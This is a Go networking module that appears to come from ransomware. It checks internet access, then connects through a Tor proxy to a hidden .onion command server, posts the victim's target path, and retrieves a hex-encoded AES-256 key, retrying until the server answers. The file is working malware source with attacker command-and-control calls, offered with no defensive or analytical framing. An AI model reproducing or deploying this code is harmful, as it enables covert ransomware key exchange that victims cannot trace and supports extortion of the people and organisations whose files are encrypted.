package networking

import (
    "fmt"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// CheckConnection -> verifies it the target has internet connection
func CheckConnection() bool {
	res, err := http.Get("https://google.com/")

	if err != nil || res.StatusCode != 200 {
		return false
	}

	defer res.Body.Close()
	return true
}

// ReceiveAESKey -> receives an AES256 key from the command server
func ReceiveAESKey(target string) *[]byte {
	const torProxy = "socks5://127.0.0.1:9050"
	targetPath := strings.NewReader(target)
	torProxyURL, err := url.Parse(torProxy)

	if err != nil {
        fmt.Println("net err 0")
		log.Fatal(err)
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(*trustedCert)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			RootCAs: caCertPool,
		},
		Proxy: http.ProxyURL(torProxyURL),
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Second * 60,
	}

	for {
		r, err := client.Get("https://zjb2hvb6ogs4mwbw.onion:4040/Cry")

		if err == nil {
			defer r.Body.Close()

			res, err := client.Post("https://zjb2hvb6ogs4mwbw.onion:4040/CryP4th", "text/plain", targetPath)

			if err != nil {
                fmt.Println("net err 1")
				log.Fatal(err)
			}

			defer res.Body.Close()

			res, err = client.Get("https://zjb2hvb6ogs4mwbw.onion:4040/n0LcRy")

			if err != nil {
                fmt.Println("net err 2")
				log.Fatal(err)
			}

			defer res.Body.Close()

			key, err := ioutil.ReadAll(res.Body)

			if err != nil {
                fmt.Println("net err 3")
				log.Fatal(err)
			}

			key, err = hex.DecodeString(string(key))

			if err != nil {
                fmt.Println("net err 4")
				log.Fatal(err)
			}

			return &key
		}
	}
}
